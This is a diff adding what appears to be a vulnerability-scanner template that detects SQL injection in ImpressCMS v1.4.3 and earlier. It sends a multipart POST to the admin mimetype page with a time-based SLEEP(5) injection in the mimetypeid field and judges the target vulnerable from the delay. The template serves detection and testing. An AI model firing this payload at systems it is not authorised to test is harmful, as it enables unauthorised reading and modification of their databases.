@@ -1,0 +1,51 @@
+id: sql-injection-impresscms-1.4.3
+info:
+  name: SQL Injection in ImpressCMS v1.4.3 and earlier
+  author: cyberinsane
+  severity: high
+  description: "SQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application."
+  reference: 
+    - https://github.com/sartlabs/0days/blob/main/ImpressCMS1.4.3/Exploit.txt
+    - https://hackerone.com/reports/1506129
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1"
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------40629177308912268471540748701
+      Cookie: tbl_SystemMimetype_sortsel=mimetypeid; tbl_limitsel=15; tbl_SystemMimetype_filtersel=default; ICMSSESSION=7c9f7a65572d2aa40f66a0d468bb20e3
+    body: |
+      -----------------------------40629177308912268471540748701
+      Content-Disposition: form-data; name="mimetypeid"
+
+      1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)
+      -----------------------------40629177308912268471540748701
+      Content-Disposition: form-data; name="extension"
+
+      bin
+      -----------------------------40629177308912268471540748701
+      Content-Disposition: form-data; name="types"
+
+      application/octet-stream
+      -----------------------------40629177308912268471540748701
+      Content-Disposition: form-data; name="name"
+
+      Binary File/Linux Executable
+      -----------------------------40629177308912268471540748701
+      Content-Disposition: form-data; name="icms_page_before_form"
+
+      http://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype
+      -----------------------------40629177308912268471540748701
+      Content-Disposition: form-data; name="op"
+
+      addmimetype
+      -----------------------------40629177308912268471540748701
+      Content-Disposition: form-data; name="modify_button"
+
+      Submit
+      -----------------------------40629177308912268471540748701--
+    matchers:
+      - type: dsl
+        dsl: 
+          - "duration>=5"
